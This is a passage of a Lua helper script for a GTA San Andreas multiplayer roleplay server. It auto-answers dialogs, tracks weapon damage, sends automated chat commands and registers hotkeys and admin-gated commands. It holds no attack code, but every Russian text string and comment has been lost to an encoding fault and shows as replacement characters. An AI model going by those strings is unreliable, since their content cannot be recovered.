					if ncost ~= nil and val <= ncost then sampSendDialogResponse(dialogid, 1, 10, "") sampCloseCurrentDialogWithButton(0) return false end
				end
			end
		end

		if config_ini.bools[47] == 1 and dialogid == 184 and style == 0 and title == "����������" and button1 == "��" and button2 == "���" and text == "�� ������ ������ ������� ����?" then sampSendDialogResponse(dialogid, 1, 0, "") return false end
		if config_ini.bools[47] == 1 and dialogid == 185 and style == 2 and title == "����������" and button1 == "�����" and button2 == "������" and text:match("��������� ������� ����") then sampSendDialogResponse(dialogid, 1, 0, "") return false end

		if config_ini.bools[48] == 1 and dialogid == 42 and style == 2 and title == "�������� ����������" and button1 == "�������" and button2 == "�����" and (skipd[3][3] or skipd[3][8][1]) then
			skipd[3][8][1] = false
			if skipd[3][3] then sampCloseCurrentDialogWithButton(0) skipd[3][3] = false return false end
			if skipd[3][5] then sampSendDialogResponse(42, 1, 7) skipd[3][3] = true return false end

			-- ����� ����������� ���������� ������� ���� �� ������� VMO.lua, �� ��� �������������� ����
			local LVax, LVay, SFPDx, SFPDy, LVPDx, LVPDy, LSPDx, LSPDy, FBIx, FBIy, SFax, SFay = 328, 1945,-1605,680, 2230, 2470, 1530, -1683, -2420, 500, -1300, 475
			local CoordX, CoordY = getCharCoordinates(PLAYER_PED)
			local tarr = {[1] = ((LVax - CoordX)^2+(LVay-CoordY)^2)^0.5, [2] = ((LSPDx - CoordX)^2+(LSPDy-CoordY)^2)^0.5, [3] = ((SFPDx - CoordX)^2+(SFPDy-CoordY)^2)^0.5, [4] = ((LVPDx - CoordX)^2+(LVPDy-CoordY)^2)^0.5, [5] = ((FBIx - CoordX)^2+(FBIy-CoordY)^2)^0.5, [6] = ((SFax - CoordX)^2+(SFay-CoordY)^2)^0.5}
			local FractionBase = indexof(math.min(tarr[1], tarr[2], tarr[3], tarr[4], tarr[5], tarr[6]), tarr)
			local req_index = FractionBase ~= 1 and FractionBase or skipd[3][4] ~= 10000 and 0 or 1
			sampSendDialogResponse(dialogid, 1, req_index, "")
			return false
		end
end

function ev.onSendGiveDamage(playerId, damage, weapid, bodypart)
	if weapid ~= nil and (weapid == 23 or weapid == 24 or weapid == 25 or weapid == 29 or weapid == 30 or weapid == 31 or weapid == 33) then
		show.show_dmind.damind.hits[weapid] = show.show_dmind.damind.hits[weapid] + 1
		show.show_dmind.damind.damage[weapid] = show.show_dmind.damind.damage[weapid] + damage
		show.show_dmind.damind.hits[1] = show.show_dmind.damind.hits[1] + 1
		show.show_dmind.damind.damage[1] = show.show_dmind.damind.damage[1] + damage

		if config_ini.bools[52] == 1 then
			lua_thread.create(function()
				local nick = sampGetPlayerNickname(playerId)
				local clist = string.sub(string.format('%x', sampGetPlayerColor(playerId)), 3)
				clist = clist == "ffff" and "fffafa" or clist
				local needindex = 0
				for k, v in ipairs(dinf[2].id) do if v == -1 then needindex = k break end end

				if needindex == 0 then 
					dinf[2].id[1] = dinf[2].id[2]
					dinf[2].nick[1] = dinf[2].nick[2]
					dinf[2].clist[1] = dinf[2].clist[2]
					dinf[2].weapon[1] = dinf[2].weapon[2]
					dinf[2].damage[1] = dinf[2].damage[2]

					dinf[2].id[2] = dinf[2].id[3]
					dinf[2].nick[2] = dinf[2].nick[3]
					dinf[2].clist[2] = dinf[2].clist[3]
					dinf[2].weapon[2] = dinf[2].weapon[3]
					dinf[2].damage[2] = dinf[2].damage[3]

					dinf[2].id[3] = -1
					dinf[2].nick[3] = ""
					dinf[2].clist[3] = ""
					dinf[2].weapon[3] = ""
					dinf[2].damage[3] = 0
					needindex = 3
				end

				dinf[2].id[needindex] = playerId
				dinf[2].nick[needindex] = nick
				dinf[2].clist[needindex] = clist
				dinf[2].weapon[needindex] = tweaponNames[weapid]
				dinf[2].damage[needindex] = math.ceil(damage)
			end)
		end
	end
end

function ev.onSendTakeDamage(playerId, damage, weapid, bodypart)
	if weapid ~= nil and (weapid == 23 or weapid == 24 or weapid == 25 or weapid == 29 or weapid == 30 or weapid == 31 or weapid == 33) then
		if config_ini.bools[52] == 1 then
			lua_thread.create(function()
				local nick = sampGetPlayerNickname(playerId)
				local clist = string.sub(string.format('%x', sampGetPlayerColor(playerId)), 3)
				clist = clist == "ffff" and "fffafa" or clist
				local needindex = 0
				for k, v in ipairs(dinf[1].id) do if v == -1 then needindex = k break end end

				if needindex == 0 then 
					dinf[1].id[1] = dinf[1].id[2]
					dinf[1].nick[1] = dinf[1].nick[2]
					dinf[1].clist[1] = dinf[1].clist[2]
					dinf[1].weapon[1] = dinf[1].weapon[2]
					dinf[1].damage[1] = dinf[1].damage[2]

					dinf[1].id[2] = dinf[1].id[3]
					dinf[1].nick[2] = dinf[1].nick[3]
					dinf[1].clist[2] = dinf[1].clist[3]
					dinf[1].weapon[2] = dinf[1].weapon[3]
					dinf[1].damage[2] = dinf[1].damage[3]

					dinf[1].id[3] = -1
					dinf[1].nick[3] = ""
					dinf[1].clist[3] = ""
					dinf[1].weapon[3] = ""
					dinf[1].damage[3] = 0
					needindex = 3
				end

				dinf[1].id[needindex] = playerId
				dinf[1].nick[needindex] = nick
				dinf[1].clist[needindex] = clist
				dinf[1].weapon[needindex] = tweaponNames[weapid]
				dinf[1].damage[needindex] = math.ceil(damage)
			end)
		end
	end
end

function ev.onSendBulletSync(targetType, targetId,  origin, target, center, weaponId)
	local weapid = tonumber(getCurrentCharWeapon(PLAYER_PED))
	if weapid ~= nil and (weapid == 23 or weapid == 24 or weapid == 25 or weapid == 29 or weapid == 30 or weapid == 31 or weapid == 33) then 
		show.show_dmind.damind.shots[weapid] = show.show_dmind.damind.shots[weapid] + 1
		show.show_dmind.damind.shots[1] = show.show_dmind.damind.shots[1] + 1 
	end

	if config_ini.bools[57] == 1 and autopred.current_weapon == weapid and not autopred.firstshot then 
		local temparr = {[23] = 1, [24] = 2, [25] = 3, [29] = 4, [31] = 5, [30] = 6, [33] = 7}
		if temparr[weapid] ~= nil then 
			lua_thread.create(function() autopred.firstshot = true wait(600) sampSendChat("/me ����" .. RP .. " � �������������� " .. config_ini.UserGun[temparr[weapid]] .. "")  end)		 
		end
	end
end

function ev.onSendExitVehicle(vehid)
	local result, car = sampGetCarHandleBySampVehicleId(vehid)
	if result and getDriverOfCar(car) == PLAYER_PED then
		local motos = {[522] = "NRG-500", [463] = "Freeway", [461] = "PCJ-600", [581] = "BF-400", [521] = "FCR-900", [468] = "Sanchez", [462] = "Faggio"}
		local carid = getCarModel(car)
		if motos[carid] ~= nil and not isCarPassengerSeatFree(car, 0) then
			local passenger = getCharInCarPassengerSeat(car, 0)
			local result, id = sampGetPlayerIdByCharHandle(passenger)
			if result then lua_thread.create(function() sampSendChat("/eject " .. id .. "") wait(500) sampSendExitVehicle(vehid) end) return false end
		end
	end
end

function ev.onSendPickedUpPickup(id)
	if skipd[2][1] == 1 then print(id) end
	skipd[1].pid = id
	if not afkstatus and not show.othervars.saccess then
		if id == skipd[2][7] then local a = os.time() - (3600 * tonumber(config_ini.Settings.timep)) lua_thread.create(function() wait(501) sampSendChat("/fs sq_message_id_1_" .. a .. "") end) return end
		if id == skipd[2][8] then lua_thread.create(function() wait(501) sampSendChat("/fs sq_message_id_2") end) return end
	end

	if isKeyDown(vkeys.VK_CONTROL) and getPickupModel(id) == 353 then
		sampSendChat("/inventory drop 13")	 --1045 1050
		lua_thread.create(function() wait(600) sampSendPickedUpPickup(id) end)
		return false
	end

end

function f_matovoz()
	while true do
		wait(0)
		if isCharInAnyCar(PLAYER_PED) then
			if config_ini.bools[48] == 1 and getCarModel(storeCarCharIsInNoSave(PLAYER_PED)) == 433 then
				if not skipd[3][8][2] then
					for k, v in ipairs(skipd[3][8][3]) do
						wait(0)
						if isCharInArea2d(PLAYER_PED, v.x1, v.y1, v.x2, v.y2, false) then
							if k == 1 then if skipd[3][4] ~= 10000 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ����� ��������.", 0xffff0000) else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ����� ���������.", 0xffff0000) end end
									
							if skipd[3][4] == 0 and k ~= 1 then 
								sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}/carm �� ����� ������ ��� ��� �������� ������.", 0xffff0000)
								skipd[3][8][4] = v
								skipd[3][8][2] = true
								break		
							end

							sampSendChat("/carm")
							skipd[3][8][1] = true
							skipd[3][8][4] = v
							skipd[3][8][2] = true
							break								
						end
					end
				else
					while isCharInArea2d(PLAYER_PED, skipd[3][8][4].x1, skipd[3][8][4].y1, skipd[3][8][4].x2, skipd[3][8][4].y2, false) do wait(0) end
					skipd[3][8][2] = false
					skipd[3][8][4] = {}
				end
			end
		end
	end
end
function f_incar()
	while true do
		wait(0)
		if isCharInAnyCar(PLAYER_PED) then
			if needtohold then setGameKeyState(16, 256) end

			if config_ini.bools[31] == 1 and not SetMode then
				if not sampIsChatInputActive() and not sampIsDialogActive(-1) and not isSampfuncsConsoleActive() then
					if wasKeyPressed(vkeys.VK_RBUTTON) then crosMode = true showcmc = true show.rand = math.random(1, 5) end
					if wasKeyReleased(vkeys.VK_RBUTTON) and not pCros then crosMode = false showcmc = false end
					if PLAYER_PED ~= getDriverOfCar(storeCarCharIsInNoSave(PLAYER_PED)) then
							if wasKeyPressed(vkeys.VK_CAPITAL) or wasKeyPressed(vkeys.VK_H) then crosMode = true pCros = true show.rand = math.random(1, 5) end
					end

				--	if crosMode then renderDrawPolygon(sx, sy, 0.5, 0.5, 12, 0xFFFF0000) end
				end
			end

			
			
		end

		
		if config_ini.bools[53] == 1 and skipd[3][7][1] == true then while true do wait(0) if not skipd[3][7][1] or getCarSpeed(storeCarCharIsInNoSave(PLAYER_PED)) == 0 then break end end if skipd[3][7][1] then skipd[3][7][1] = false lua_thread.create(function() wait(500) sampSendChat("/fill") end) end end

		if spsyns.mode and spsyns.firstshow then
			while isKeyDown(vkeys.VK_CONTROL) do wait(0) end
			spsyns.firstshow = false
			local cidcar = getCarModel(spsyns.car)
			local cresult2, cid = sampGetVehicleIdByCarHandle(spsyns.car)
			local fcar = cIDs[cid] == nil and cid or cIDs[cid]
			sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ������������� �������� � " .. tVehicleNames[cidcar-399] .. " [" .. fcar .. "].")	
			spsyns.time = os.clock()
			lua_thread.create(function()						
				while true do
					wait(0)
					if not doesVehicleExist(spsyns.car) or getDriverOfCar(spsyns.car) == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���������/�������� �������. ������������� �������� (#000)!") spsyns.mode = false wait(600) sampSendChat("/slimit 50") wait(600) sampSendChat("/slimit") break end
					if not isCharInAnyCar(PLAYER_PED) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� �������� ���������. ������������� �������� (#002).") spsyns.mode = false wait(600) sampSendChat("/slimit 50") wait(600) sampSendChat("/slimit") break end
					if isKeyDown(vkeys.VK_CONTROL) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}��������� ������������� ��������.") spsyns.mode = false wait(600) sampSendChat("/slimit 50") wait(600) sampSendChat("/slimit") break end
					if spsyns.time + 0.65 <= os.clock() then
						local myspeed = math.floor(getCarSpeed(storeCarCharIsInNoSave(PLAYER_PED)) * 2)
						local hspeed = math.floor(getCarSpeed(spsyns.car) * 2)
						if myspeed ~= hspeed then
							if hspeed < 20 or hspeed > 90 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���������� ���������������� ��������. ������������� �������� (#001)!") spsyns.mode = false wait(600) sampSendChat("/slimit 50") wait(600) sampSendChat("/slimit") break end
							sampSendChat("/slimit " .. hspeed .. "")
							spsyns.time = os.clock()
						end
					end
				end		
			end)	
		end
	end
end

function f_onfoot()
	while true do
		wait(0)
		if isCharOnFoot(PLAYER_PED) then
			if needtohold then setGameKeyState(1, -256) end

			if config_ini.bools[31] == 1 and not SetMode then
				showcmc = false
				pCros = false
				if tonumber(getCurrentCharWeapon(PLAYER_PED)) == 33 then
					if wasKeyPressed(vkeys.VK_RBUTTON) then crosMode = true showcmc = true end
					if wasKeyReleased(vkeys.VK_RBUTTON) then crosMode = false showcmc = false end
				else
					if memory.getint8(ped + 0x528, false) == 19 then crosMode = true else crosMode = false end
				end							
			end
		end
	end
end

function f_ckey() -- ### ����������� �������
	while true do
		wait(0)					
		if CTaskArr[10][1] ~= "" then -- ID 10
			local kv = kvadrat()
			if kv ~= nil and kv == CTaskArr[10][1] then
				CTaskArr[10][1] = ""
				table.insert(CTaskArr[1], 10)
				table.insert(CTaskArr[2], os.time())
				table.insert(CTaskArr[3], kv)
			end
		end

		------------ id 5 and 9
		local car = isCharInAnyCar(PLAYER_PED) and storeCarCharIsInNoSave(PLAYER_PED) or -1
		local idc = car ~= -1 and getCarModel(car) or -1
		local x, y, z = getCharCoordinates(PLAYER_PED) -- ID 5 � 6
		if idc == 433 and getDriverOfCar(car) == PLAYER_PED then	
			if not CTaskArr[10][2][2] then
				CTaskArr[10][2][2] = true	
				if x >= 266 and x <= 287 and y >= 1940 and y <= 2004 and z > 16 and z < 30 then
					table.insert(CTaskArr[1], 5)
					table.insert(CTaskArr[2], os.time())
					table.insert(CTaskArr[3], CTaskArr[10][2][1][1])
				end
			end
		elseif idc == 497 and getDriverOfCar(car) == PLAYER_PED then	
			if not CTaskArr[10][6] then
				CTaskArr[10][6] = true	
				if x >= 189 and x <= 224 and y >= 1923 and y <= 1939 and z > 22 and z < 25 then
					table.insert(CTaskArr[1], 9)
					table.insert(CTaskArr[2], os.time())
					table.insert(CTaskArr[3], CTaskArr[10][2][1][1])
				end
			end
		else
			if CTaskArr[10][2][2] then -- �������
				CTaskArr[10][2][2] = false
				if x >= 266 and x <= 287 and y >= 1940 and y <= 2004 and z > 16 and z < 30 then	
					table.insert(CTaskArr[1], 6)
					table.insert(CTaskArr[2], os.time())
					table.insert(CTaskArr[3], CTaskArr[10][2][1][1])
				end
			end

			if CTaskArr[10][6] then
				CTaskArr[10][6] = false -- ��������
				if x >= 189 and x <= 224 and y >= 1923 and y <= 1939 and z > 22 and z < 25 then	
					table.insert(CTaskArr[1], 11)
					table.insert(CTaskArr[2], os.time())
					table.insert(CTaskArr[3], CTaskArr[10][2][1][1])
				end
			end
		end

		----------- id 8
		if isCharOnFoot(PLAYER_PED) then
			local car = storeClosestEntities(PLAYER_PED)
			if car ~= -1 and not CTaskArr[10][5] then
				local myX, myY, myZ = getCharCoordinates(PLAYER_PED) -- �������� ���� ����������
				local cX, cY, cZ = getCarCoordinates(car) -- �������� ���������� ������
				local distanse = math.ceil(math.sqrt( ((myX-cX)^2) + ((myY-cY)^2) + ((myZ-cZ)^2))) 
				if (getCarHealth(car) == 300 or (isCarTireBurst(car, 0) or isCarTireBurst(car, 1) or isCarTireBurst(car, 2) or isCarTireBurst(car, 3) or isCarTireBurst(car, 4))) and distanse <= 5 then
					table.insert(CTaskArr[1], 8)
					table.insert(CTaskArr[2], os.time())
					table.insert(CTaskArr[3], "")
					CTaskArr[10][5] = true
				end
			end
		end

		----------- id 3
		if CTaskArr[10][4] and isCharInArea2d(PLAYER_PED, -84, 1606, 464, 2148, false) then
			CTaskArr[10][4] = false
			table.insert(CTaskArr[1], 3)
			table.insert(CTaskArr[2], os.time())
			table.insert(CTaskArr[3], "")
		end
		--	[ML] (script) coordinater.lua: 266.38027954102   1940.4320068359   17.640625
		--	[ML] (script) coordinater.lua: 287.63711547852   2004.6898193359   17.640625
		sortCarr() --### ������� ������� ����������� �������, ���������� ������ ������������ ��������
	end
end

function main()
	if not isSampLoaded() or not isSampfuncsLoaded() then return end
			while not isSampAvailable() do wait(100) end
			sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ������� ��������.", 0xFFFF0000)
			prepare()
			while not preparecomplete do wait(0) end

			rkeys.unRegisterHotKey(makeHotKey(13))
			imgui.Process = true
			imgui.ShowCursor = false
			imgui.LockPlayer = false
			sx, sy = convert3DCoordsToScreen(get_crosshair_position())
			ped = getCharPointer(PLAYER_PED)
			PICKUP_POOL = sampGetPickupPoolPtr()

			if config_ini.bools[58] == 1 then displayHud(false) end
			lua_thread.create(function() f_incar() end)
			lua_thread.create(function() f_onfoot() end)
			lua_thread.create(function() f_ckey() end)
			lua_thread.create(function() f_matovoz() end)
			while true do
					wait(0)
					local result, myid = sampGetPlayerIdByCharHandle(PLAYER_PED)
					if suspendkeys == 2 then
							rkeys.registerHotKey(makeHotKey(13), true, hk_13)
							rkeys.registerHotKey(makeHotKey(1), true, hk_1)
							rkeys.registerHotKey(makeHotKey(2), true, hk_2)
							rkeys.registerHotKey(makeHotKey(3), true, hk_3)
							rkeys.registerHotKey(makeHotKey(4), true, hk_4)
							rkeys.registerHotKey(makeHotKey(5), true, hk_5)
							rkeys.registerHotKey(makeHotKey(6), true, hk_6)
							rkeys.registerHotKey(makeHotKey(7), true, hk_7)
							rkeys.registerHotKey(makeHotKey(8), true, hk_8)
							rkeys.registerHotKey(makeHotKey(9), true, hk_9)
							rkeys.registerHotKey(makeHotKey(10), true, hk_10)
							rkeys.registerHotKey(makeHotKey(11), true, hk_11)
							rkeys.registerHotKey(makeHotKey(12), true, hk_12)
						--rkeys.registerHotKey(makeHotKey(14), true, hk_14)
							--rkeys.registerHotKey(makeHotKey(15), true, hk_15)
							--rkeys.registerHotKey(makeHotKey(16), true, hk_16)
							--rkeys.registerHotKey(makeHotKey(17), true, hk_17)
							--rkeys.registerHotKey(makeHotKey(18), true, hk_18)
							rkeys.registerHotKey(makeHotKey(19), true, hk_19)
							rkeys.registerHotKey(makeHotKey(20), true, hk_20)
							rkeys.registerHotKey(makeHotKey(21), true, hk_21)
							rkeys.registerHotKey(makeHotKey(22), true, hk_22)
							rkeys.registerHotKey(makeHotKey(23), true, hk_23)
							--rkeys.registerHotKey(makeHotKey(24), true, hk_24)
							rkeys.registerHotKey(makeHotKey(25), true, hk_25)
							rkeys.registerHotKey(makeHotKey(26), true, hk_26)
							rkeys.registerHotKey(makeHotKey(27), true, hk_27)
							rkeys.registerHotKey(makeHotKey(28), true, hk_28)
							rkeys.registerHotKey(makeHotKey(29), true, hk_29)
							rkeys.registerHotKey(makeHotKey(30), true, hk_30)
							rkeys.registerHotKey(makeHotKey(31), true, hk_31)
							rkeys.registerHotKey(makeHotKey(32), true, hk_32)
							rkeys.registerHotKey(makeHotKey(33), true, hk_33)
							rkeys.registerHotKey(makeHotKey(34), true, hk_34)
							rkeys.registerHotKey(makeHotKey(35), true, hk_35)
							rkeys.registerHotKey(makeHotKey(36), true, hk_36)
							rkeys.registerHotKey(makeHotKey(37), true, hk_37)
							rkeys.registerHotKey(makeHotKey(38), true, hk_38)
							rkeys.registerHotKey(makeHotKey(39), true, hk_39)
							rkeys.registerHotKey(makeHotKey(40), true, hk_40)
							rkeys.registerHotKey(makeHotKey(41), true, hk_41)
							rkeys.registerHotKey(makeHotKey(42), true, hk_42)
							rkeys.registerHotKey(makeHotKey(43), true, hk_43)

							sampRegisterChatCommand(config_ini.Commands[1], cmd_ob)
							sampRegisterChatCommand(config_ini.Commands[2], cmd_sopr)
							sampRegisterChatCommand(config_ini.Commands[3], cmd_zgruz)
							sampRegisterChatCommand(config_ini.Commands[4], cmd_rgruz)
							sampRegisterChatCommand(config_ini.Commands[5], cmd_bgruz)
							sampRegisterChatCommand(config_ini.Commands[6], cmd_kv)
							sampRegisterChatCommand(config_ini.Commands[7], cmd_e)
							--sampRegisterChatCommand(config_ini.Commands[8], cmd_que)
							sampRegisterChatCommand(config_ini.Commands[9], cmd_r)
							sampRegisterChatCommand(config_ini.Commands[10], cmd_pr)
							sampRegisterChatCommand(config_ini.Commands[11], hk_5)
							sampRegisterChatCommand(config_ini.Commands[12], cmd_gr)
							sampRegisterChatCommand(config_ini.Commands[13], cmd_hit)
							sampRegisterChatCommand(config_ini.Commands[14], cmd_cl)
							sampRegisterChatCommand(config_ini.Commands[15], hk_11)
							sampRegisterChatCommand(config_ini.Commands[16], cmd_memb)
							sampRegisterChatCommand(config_ini.Commands[17], cmd_chs)
							sampRegisterChatCommand(config_ini.Commands[18], cmd_mp)
							sampRegisterChatCommand(config_ini.Commands[19], cmd_z)
							sampRegisterChatCommand(config_ini.Commands[20], cmd_mem1)
							sampRegisterChatCommand(config_ini.Commands[21], cmd_sw)
							sampRegisterChatCommand(config_ini.Commands[22], cmd_st)
							--sampRegisterChatCommand(config_ini.Commands[23], cmd_stroy)
						--	sampRegisterChatCommand(config_ini.Commands[24], cmd_altenter)
							sampRegisterChatCommand(config_ini.Commands[25], cmd_afk)
						--	sampRegisterChatCommand(config_ini.Commands[26], cmd_destroy)
							sampRegisterChatCommand(config_ini.Commands[27], cmd_mcall)
							sampRegisterChatCommand(config_ini.Commands[28], cmd_showp)
							--sampRegisterChatCommand(config_ini.Commands[29], cmd_priziv)

							sampRegisterChatCommand(config_ini.UserCBinderC[1], cmd_u1)
							sampRegisterChatCommand(config_ini.UserCBinderC[2], cmd_u2)
							sampRegisterChatCommand(config_ini.UserCBinderC[3], cmd_u3)
							sampRegisterChatCommand(config_ini.UserCBinderC[4], cmd_u4)
							sampRegisterChatCommand(config_ini.UserCBinderC[5], cmd_u5)
							sampRegisterChatCommand(config_ini.UserCBinderC[6], cmd_u6)
							sampRegisterChatCommand(config_ini.UserCBinderC[7], cmd_u7)
							sampRegisterChatCommand(config_ini.UserCBinderC[8], cmd_u8)
							sampRegisterChatCommand(config_ini.UserCBinderC[9], cmd_u9)
							sampRegisterChatCommand(config_ini.UserCBinderC[10], cmd_u10)
							sampRegisterChatCommand(config_ini.UserCBinderC[11], cmd_u11)
							sampRegisterChatCommand(config_ini.UserCBinderC[12], cmd_u12)
							sampRegisterChatCommand(config_ini.UserCBinderC[13], cmd_u13)
							sampRegisterChatCommand(config_ini.UserCBinderC[14], cmd_u14)
							sampRegisterChatCommand(config_ini.UserCBinderC[15], cmd_u15)
							sampRegisterChatCommand(config_ini.UserCBinderC[16], cmd_u16)
							sampRegisterChatCommand(config_ini.UserCBinderC[17], cmd_u17)
							sampRegisterChatCommand(config_ini.UserCBinderC[18], cmd_u18)

							sampRegisterChatCommand("commandhelp", cmd_commandhelp)
							sampRegisterChatCommand("bugreport", cmd_bugreport)
							sampRegisterChatCommand("mkv", cmd_mkv)
							sampRegisterChatCommand("bkv", cmd_bkv)
							sampRegisterChatCommand("lej", cmd_lej)
							sampRegisterChatCommand("bp", cmd_bp)
							sampRegisterChatCommand("cars", cmd_cars)
							sampRegisterChatCommand("scr", cmd_scr)
							sampRegisterChatCommand("piss", cmd_piss)
							sampRegisterChatCommand("iznas", cmd_iznas)
							sampRegisterChatCommand("dclean", cmd_dclean)
							sampRegisterChatCommand("toggle", cmd_toggle)
							sampRegisterChatCommand("duel", cmd_duel)
							sampRegisterChatCommand("mon", cmd_mon)

							if alevel > -1 then
									sampRegisterChatCommand("balogin", cmd_balogin)
							end

							if alevel > 0 then
									sampRegisterChatCommand("lek", cmd_lek)
									sampRegisterChatCommand("pcheck", cmd_pcheck)
									sampRegisterChatCommand("tren", cmd_tren)
							end

							if alevel > 1 then
									sampRegisterChatCommand("padd", cmd_padd)
									sampRegisterChatCommand("pdel", cmd_pdel)
									sampRegisterChatCommand("mark", cmd_mark)
									sampRegisterChatCommand("add", cmd_add)
									sampRegisterChatCommand("del", cmd_del)
									sampRegisterChatCommand("change", cmd_change)
							end

							if alevel > 2 then
									sampRegisterChatCommand("otm", cmd_otm)	
							end

							if alevel == 3 or alevel == 6 then sampRegisterChatCommand("fond", cmd_fond) end

							if alevel > 4 then
								sampRegisterChatCommand("moder", cmd_moder)
								sampRegisterChatCommand("reg", cmd_reg)
								sampRegisterChatCommand("ban", cmd_ban)
							end
							
							piearr.action = 0
							piearr.pie_mode.v = false -- ����� PieMenu
							piearr.pie_keyid = makeHotKey(44)[1]
							piearr.pie_elements =	{}

							if config_ini.UserPieMenuNames[1] ~= "" then table.insert(piearr.pie_elements, {name = config_ini.UserPieMenuNames[1], action = function() piearr.action = 1 end, next = nil}) end
							if config_ini.UserPieMenuNames[2] ~= "" then table.insert(piearr.pie_elements, {name = config_ini.UserPieMenuNames[2], action = function() piearr.action = 2 end, next = nil}) end
							if config_ini.UserPieMenuNames[3] ~= "" then table.insert(piearr.pie_elements, {name = config_ini.UserPieMenuNames[3], action = function() piearr.action = 3 end, next = nil}) end
							if config_ini.UserPieMenuNames[4] ~= "" then table.insert(piearr.pie_elements, {name = config_ini.UserPieMenuNames[4], action = function() piearr.action = 4 end, next = nil}) end
							if config_ini.UserPieMenuNames[5] ~= "" then table.insert(piearr.pie_elements, {name = config_ini.UserPieMenuNames[5], action = function() piearr.action = 5 end, next = nil}) end
							if config_ini.UserPieMenuNames[6] ~= "" then table.insert(piearr.pie_elements, {name = config_ini.UserPieMenuNames[6], action = function() piearr.action = 6 end, next = nil}) end
							if config_ini.UserPieMenuNames[7] ~= "" then table.insert(piearr.pie_elements, {name = config_ini.UserPieMenuNames[7], action = function() piearr.action = 7 end, next = nil}) end
							if config_ini.UserPieMenuNames[8] ~= "" then table.insert(piearr.pie_elements, {name = config_ini.UserPieMenuNames[8], action = function() piearr.action = 8 end, next = nil}) end
							if config_ini.UserPieMenuNames[9] ~= "" then table.insert(piearr.pie_elements, {name = config_ini.UserPieMenuNames[9], action = function() piearr.action = 9 end, next = nil}) end
							if config_ini.UserPieMenuNames[10] ~= "" then table.insert(piearr.pie_elements, {name = config_ini.UserPieMenuNames[10], action = function() piearr.action = 10 end, next = nil}) end
							-- for k, v in pairs(config_ini.UserPieMenuNames) do
							-- 		print(pie_index)
							-- 		if pie_index == 11 then break end
							-- 		if v ~= "" then
							-- 				table.insert(piearr.pie_elements, {name = v, action = function() piearr.action = pie_index end, next = nil})
							-- 				pie_index = pie_index + 1
							-- 		end
							-- end
							suspendkeys = 0
					end

					if not guis.mainw.v and not SetMode and not piearr.pie_mode.v then imgui.ShowCursor = false imgui.LockPlayer = false if suspendkeys == 1 then suspendkeys = 2 sampSetChatDisplayMode(3) end end

					if needtosave then
							lua_thread.create(
									function()
											config_ini.UserClist[1] = tostring(u8:decode(guibuffers.clistparams.clist1.v))
											config_ini.UserClist[2] = tostring(u8:decode(guibuffers.clistparams.clist2.v))
											config_ini.UserClist[3] = tostring(u8:decode(guibuffers.clistparams.clist3.v))
											config_ini.UserClist[4] = tostring(u8:decode(guibuffers.clistparams.clist4.v))
											config_ini.UserClist[5] = tostring(u8:decode(guibuffers.clistparams.clist5.v))
											config_ini.UserClist[6] = tostring(u8:decode(guibuffers.clistparams.clist6.v))
											config_ini.UserClist[7] = tostring(u8:decode(guibuffers.clistparams.clist7.v))
											config_ini.UserClist[8] = tostring(u8:decode(guibuffers.clistparams.clist8.v))
											config_ini.UserClist[9] = tostring(u8:decode(guibuffers.clistparams.clist9.v))
											config_ini.UserClist[10] = tostring(u8:decode(guibuffers.clistparams.clist10.v))
											config_ini.UserClist[11] = tostring(u8:decode(guibuffers.clistparams.clist11.v))
											config_ini.UserClist[13] = tostring(u8:decode(guibuffers.clistparams.clist13.v))
											config_ini.UserClist[14] = tostring(u8:decode(guibuffers.clistparams.clist14.v))
											config_ini.UserClist[15] = tostring(u8:decode(guibuffers.clistparams.clist15.v))
											config_ini.UserClist[16] = tostring(u8:decode(guibuffers.clistparams.clist16.v))
											config_ini.UserClist[17] = tostring(u8:decode(guibuffers.clistparams.clist17.v))
											config_ini.UserClist[18] = tostring(u8:decode(guibuffers.clistparams.clist18.v))
											config_ini.UserClist[19] = tostring(u8:decode(guibuffers.clistparams.clist19.v))
											config_ini.UserClist[20] = tostring(u8:decode(guibuffers.clistparams.clist20.v))
											config_ini.UserClist[21] = tostring(u8:decode(guibuffers.clistparams.clist21.v))
											config_ini.UserClist[22] = tostring(u8:decode(guibuffers.clistparams.clist22.v))
											config_ini.UserClist[23] = tostring(u8:decode(guibuffers.clistparams.clist23.v))
											config_ini.UserClist[24] = tostring(u8:decode(guibuffers.clistparams.clist24.v))
											config_ini.UserClist[25] = tostring(u8:decode(guibuffers.clistparams.clist25.v))
											config_ini.UserClist[26] = tostring(u8:decode(guibuffers.clistparams.clist26.v))
											config_ini.UserClist[27] = tostring(u8:decode(guibuffers.clistparams.clist27.v))
											config_ini.UserClist[28] = tostring(u8:decode(guibuffers.clistparams.clist28.v))
											config_ini.UserClist[29] = tostring(u8:decode(guibuffers.clistparams.clist29.v))
											config_ini.UserClist[30] = tostring(u8:decode(guibuffers.clistparams.clist30.v))
											config_ini.UserClist[31] = tostring(u8:decode(guibuffers.clistparams.clist31.v))
											config_ini.UserClist[32] = tostring(u8:decode(guibuffers.clistparams.clist32.v))
											config_ini.UserClist[33] = tostring(u8:decode(guibuffers.clistparams.clist33.v))
											
											config_ini.UserGun[1] = tostring(u8:decode(guibuffers.gunparams.gun1.v))
											config_ini.UserGun[2] = tostring(u8:decode(guibuffers.gunparams.gun2.v))
											config_ini.UserGun[3] = tostring(u8:decode(guibuffers.gunparams.gun3.v))
											config_ini.UserGun[4] = tostring(u8:decode(guibuffers.gunparams.gun4.v))
											config_ini.UserGun[5] = tostring(u8:decode(guibuffers.gunparams.gun5.v))
											config_ini.UserGun[6] = tostring(u8:decode(guibuffers.gunparams.gun6.v))
											config_ini.UserGun[7] = tostring(u8:decode(guibuffers.gunparams.gun7.v))

											config_ini.UserBinder[1] = tostring(u8:decode(guibuffers.ubinds.bind1.v))
											config_ini.UserBinder[2] = tostring(u8:decode(guibuffers.ubinds.bind2.v))
											config_ini.UserBinder[3] = tostring(u8:decode(guibuffers.ubinds.bind3.v))
											config_ini.UserBinder[4] = tostring(u8:decode(guibuffers.ubinds.bind4.v))
											config_ini.UserBinder[5] = tostring(u8:decode(guibuffers.ubinds.bind5.v))
